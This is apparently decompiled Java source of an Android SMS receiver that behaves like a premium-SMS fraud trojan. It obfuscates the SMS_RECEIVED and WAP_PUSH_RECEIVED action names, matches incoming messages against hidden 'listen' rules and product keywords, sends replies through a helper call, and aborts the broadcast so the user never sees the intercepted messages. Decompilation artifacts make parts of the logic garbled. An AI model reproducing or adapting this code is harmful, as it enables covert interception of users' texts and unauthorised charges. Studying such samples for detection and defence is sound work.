package aa.ff;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.telephony.SmsMessage;
import com.mv.xing2.Util;
import com.zyypt.video.a;
import org.json.JSONObject;

public class FReceive
  extends BroadcastReceiver
{
  private static final String TAG = "FService";
  private static MyBroadcastMgr spamMgr = null;
  private Context context;
  
  public FReceive() {}
  
  private boolean checkListenSMS(Intent paramIntent)
  {
    boolean bool2 = false;
    StringBuffer localStringBuffer = new StringBuffer(100);
    localStringBuffer.append("SM");
    localStringBuffer.append("S_R");
    localStringBuffer.append("ECEI");
    localStringBuffer.append("VED");
    int i;
    boolean bool1;
    if (paramIntent.getAction().contains(localStringBuffer.toString()))
    {
      paramIntent = getMessages(paramIntent);
      int j = paramIntent.length;
      i = 0;
      if (i < j)
      {
        localStringBuffer = paramIntent[i];
        a.a(localStringBuffer.getOriginatingAddress() + " : " + localStringBuffer.getDisplayOriginatingAddress() + " : " + localStringBuffer.getDisplayMessageBody() + " : " + localStringBuffer.getTimestampMillis());
        String str = localStringBuffer.getDisplayMessageBody();
        bool1 = IsListen(localStringBuffer.getDisplayOriginatingAddress(), str);
        a.a("checkListenSMS bListen = " + bool1);
        if (bool1)
        {
          spamMgr.javaSetListenResult(1);
          i = 1;
          label199:
          bool1 = IsListen2(paramIntent);
        }
      }
    }
    for (;;)
    {
      if ((i != 0) || (bool1)) {
        bool2 = true;
      }
      return bool2;
      i += 1;
      break;
      i = 0;
      break label199;
      bool1 = false;
      i = 0;
    }
  }
  
  private SmsMessage[] getMessages(Intent paramIntent)
  {
    int j = 0;
    Object localObject = (Object[])paramIntent.getSerializableExtra("pdus");
    paramIntent = new byte[localObject.length][];
    int i = 0;
    while (i < paramIntent.length)
    {
      paramIntent[i] = ((byte[])(byte[])localObject[i]);
      i += 1;
    }
    localObject = new byte[paramIntent.length][];
    SmsMessage[] arrayOfSmsMessage = new SmsMessage[localObject.length];
    i = j;
    while (i < localObject.length)
    {
      localObject[i] = paramIntent[i];
      arrayOfSmsMessage[i] = SmsMessage.createFromPdu(localObject[i]);
      i += 1;
    }
    return arrayOfSmsMessage;
  }
  
  private boolean isListenRecord(String paramString1, String paramString2, long paramLong, String paramString3)
  {
    paramString3 = paramString3.trim();
    if (paramString3.length() == 0) {}
    do
    {
      return false;
      paramString3 = paramString3.split("\\+");
    } while ((paramString3.length < 4) || (paramLong > Long.valueOf(paramString3[2]).longValue() + Long.valueOf(paramString3[3]).longValue()) || ((paramString3[0] != "*") && (!paramString2.contains(paramString3[0]))) || ((paramString3[1] != "*") && (!paramString1.contains(paramString3[1]))));
    return true;
  }
  
  public boolean IsListen(String paramString1, String paramString2)
  {
    if ((paramString1.trim().equals("")) && (paramString2.trim().equals(""))) {
      return false;
    }
    paramString2 = paramString2.trim();
    paramString1 = paramString1.trim();
    if ((paramString1.length() == 0) && (paramString2.length() == 0)) {
      return false;
    }
    long l = System.nanoTime() / 1000000L;
    a.a("FService number:" + paramString1 + " text:" + paramString2);
    if (isListenRecord(paramString1, paramString2, l, spamMgr.javaGetWaitSms()))
    {
      spamMgr.javaSetWaitResult(1);
      return true;
    }
    String[] arrayOfString = spamMgr.javaGetListenRecords().split(";");
    int j = arrayOfString.length;
    int i = 0;
    while (i < j)
    {
      if (isListenRecord(paramString1, paramString2, l, arrayOfString[i])) {
        return true;
      }
      i += 1;
    }
    return false;
  }
  
  public boolean IsListen2(SmsMessage[] paramArrayOfSmsMessage)
  {
    for (;;)
    {
      int j;
      int n;
      int i1;
      try
      {
        Object localObject1 = Util.javaGetDataFromSharedPref(this.context, "data2info");
        if (localObject1 == null) {
          return false;
        }
        localObject1 = new JSONObject((String)localObject1);
        Object localObject2 = ((JSONObject)localObject1).getString("productid");
        String str1 = ((JSONObject)localObject1).getString("nodeid");
        Object localObject3 = ((JSONObject)localObject1).getString("appid");
        localObject2 = ((String)localObject2).split(",");
        localObject3 = ((String)localObject3).split(",");
        int i2 = paramArrayOfSmsMessage.length;
        int i = 0;
        if (i < i2)
        {
          Object localObject4 = paramArrayOfSmsMessage[i];
          String str2 = ((SmsMessage)localObject4).getDisplayOriginatingAddress();
          localObject4 = ((SmsMessage)localObject4).getDisplayMessageBody();
          int i3;
          if (localObject2.length > 0)
          {
            i3 = localObject2.length;
            k = 0;
            m = 0;
            j = 0;
            if (j < i3)
            {
              String str3 = localObject2[j].trim();
              n = k;
              i1 = m;
              if (str3.length() <= 0) {
                break label406;
              }
              m += 1;
              n = k;
              i1 = m;
              if (!((String)localObject4).contains(str3)) {
                break label406;
              }
              n = k + 1;
              i1 = m;
              break label406;
            }
            if ((m == k) && (m > 0))
            {
              Util.sayHelloT(str2, str1);
              return true;
            }
          }
          if (localObject3.length > 0)
          {
            i3 = localObject3.length;
            m = 0;
            n = 0;
            j = 0;
            if (j < i3)
            {
              str2 = localObject3[j].trim();
              i1 = m;
              k = n;
              if (str2.length() > 0)
              {
                n += 1;
                boolean bool = ((String)localObject4).contains(str2);
                i1 = m;
                k = n;
                if (bool)
                {
                  i1 = m + 1;
                  k = n;
                }
              }
              j += 1;
              m = i1;
              n = k;
              continue;
            }
            if ((n == m) && (n > 0)) {
              try
              {
                paramArrayOfSmsMessage = ((JSONObject)localObject1).getString("channelid");
                localObject1 = ((JSONObject)localObject1).getString("contentid");
                Util.javaSetDataToSharedPref(this.context, "data2_last", paramArrayOfSmsMessage + ',' + (String)localObject1);
                Util.javaSetDataToSharedPref(this.context, "data2info", "");
                return true;
              }
              catch (Exception paramArrayOfSmsMessage)
              {
                return true;
              }
            }
          }
          i += 1;
        }
        else
        {
          return false;
        }
      }
      catch (Exception paramArrayOfSmsMessage)
      {
        return false;
      }
      label406:
      j += 1;
      int k = n;
      int m = i1;
    }
  }
  
  public void onReceive(Context paramContext, Intent paramIntent)
  {
    a.a("FService>>>SMSSpamReceiver::onReceive<<<" + paramIntent.getAction());
    spamMgr = MyBroadcastMgr.getInstance(paramContext);
    this.context = paramContext;
    paramContext = new StringBuffer(100);
    paramContext.append("WA");
    paramContext.append("P_PUS");
    paramContext.append("H_REC");
    paramContext.append("EIVED");
    if (paramIntent.getAction().contains(paramContext.toString())) {}
    for (boolean bool = true;; bool = checkListenSMS(paramIntent))
    {
      spamMgr = null;
      if (bool) {
        abortBroadcast();
      }
      return;
    }
  }
}
